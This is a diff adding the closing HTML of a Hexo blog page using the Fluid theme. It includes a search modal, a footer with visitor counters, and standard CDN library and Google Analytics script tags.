+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-WTRCMZDFLE', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-WTRCMZDFLE');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
